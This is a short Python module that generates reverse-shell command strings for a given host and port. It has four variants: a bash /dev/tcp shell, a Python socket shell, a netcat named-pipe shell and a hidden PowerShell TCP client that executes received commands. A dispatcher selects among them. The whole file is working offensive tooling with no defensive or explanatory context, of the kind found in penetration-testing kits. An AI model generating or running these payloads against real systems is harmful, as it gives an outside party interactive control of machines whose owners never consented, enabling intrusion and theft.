from __future__ import annotations


def bash_tcp(lhost: str, lport: int) -> str:
    return f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"


def python_tcp(lhost: str, lport: int) -> str:
    return (
        "python3 -c 'import socket,subprocess,os;"
        f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "subprocess.call([\"/bin/sh\",\"-i\"])'"
    )


def nc_mkfifo(lhost: str, lport: int) -> str:
    return f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"


def powershell_tcp(lhost: str, lport: int) -> str:
    return (
        f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
        f"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
        "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
        "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
        "$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
        "$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"
    )


SHELLS = {
    "bash_tcp": bash_tcp,
    "python_tcp": python_tcp,
    "nc_mkfifo": nc_mkfifo,
    "powershell_tcp": powershell_tcp,
}


def make(kind: str, lhost: str, lport: int) -> str:
    fn = SHELLS.get(kind)
    if not fn:
        raise KeyError(f"unknown shell kind: {kind}")
    return fn(lhost, lport)
